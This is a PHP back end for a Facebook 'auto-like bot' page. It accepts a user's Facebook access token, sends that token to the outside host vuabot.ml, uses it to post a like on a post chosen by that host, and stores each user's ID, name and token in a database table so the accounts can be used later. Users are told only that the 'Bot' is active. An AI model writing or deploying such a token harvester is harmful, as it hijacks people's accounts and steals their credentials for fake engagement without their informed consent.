<?php
$token = trim($_POST['token']);
include'connect.php';
include'function.php';
   mysql_query("CREATE TABLE IF NOT EXISTS `Asu` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
$getpost = "http://vuabot.ml/login/iphone.php/iphone.php?user=".$token;
$get = file_get_contents($getpost);
$array = json_decode($get, true);
$postid = $array[data][0][id];
$com = "https://graph.facebook.com/".$postid."/likes?method=post&access_token=".$token;
$ren = file_get_contents($com);

if($userData['id']){
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         Asu
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               Asu
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            Asu
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Asu
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
echo('<script>alert("Success, Bot Active ^_^"); </script>');

}else{
die('<script>alert("Your Token Invalid -_-"); </script>');
}
?>